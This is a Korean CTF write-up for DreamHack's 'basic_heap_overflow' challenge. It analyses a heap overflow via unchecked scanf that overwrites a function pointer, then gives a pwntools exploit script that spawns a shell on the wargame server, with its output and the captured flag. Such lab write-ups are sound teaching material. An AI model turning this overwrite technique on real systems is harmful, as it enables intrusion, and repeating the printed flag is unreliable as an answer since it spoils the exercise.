# [DreamHack] basic_heap_overflow

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(basic_heap_overflow)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_heap_overflow.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8533363/basic_heap_overflow.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160965566-33b85490-9e36-4202-a3fc-1a95d5a980f2.png)

## Analysis

```c
struct over {
    void (*table)();
};

void get_shell() {
    system("/bin/sh");
}

void table_func() {
    printf("overwrite_me!");
}

int main() {
    char *ptr = malloc(0x20);

    struct over *over = malloc(0x20);

    initialize();

    over->table = table_func;

    scanf("%s", ptr);

    if( !over->table ){
        return 0;
    }

    over->table();
    return 0;
}
```

`ptr`과 `over`를 차례로 `malloc()`으로 할당하여, 두 메모리 공간은 인접해 있게 된다. `scanf("%s", ptr)`에서 BOF가 발생하여 `over`의 메모리 전체를 덮어쓸 수 있다. `over` 구조체에는 함수 포인터 `table`이 있고 이 포인터에는 `table_func()`의 주소가 들어가 있는데, 이 포인터를 `get_shell()`의 주소로 덮으면 `over->table()`이 호출될 때 `get_shell()`이 호출되어 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_heap_overflow')
else:
    r = remote('host1.dreamhack.games', 18583)

get_shell = 0x804867b  # get_shell()

r.sendline(b'a' * 0x28 + p32(get_shell))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 18583: Done
[*] Switching to interactive mode
$ cat flag
DH{f1c2027b0b36ee204723079c7ae6c042}
```